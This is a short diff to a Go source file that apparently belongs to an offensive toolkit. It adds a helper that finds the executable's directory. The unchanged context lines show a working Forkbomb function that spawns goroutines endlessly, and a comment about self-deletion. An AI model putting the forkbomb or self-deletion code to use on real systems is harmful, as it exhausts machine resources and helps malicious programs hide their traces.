@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"regexp"
 	"runtime"
 	"strconv"
@@ -168,6 +169,15 @@ func Forkbomb() {
 	for {
 		go Forkbomb()
 	}
+}
+
+func GetPath() (string, error) {
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	exPath := filepath.Dir(ex)
+	return exPath, err
 }
 
 // Remove is used to self delete.
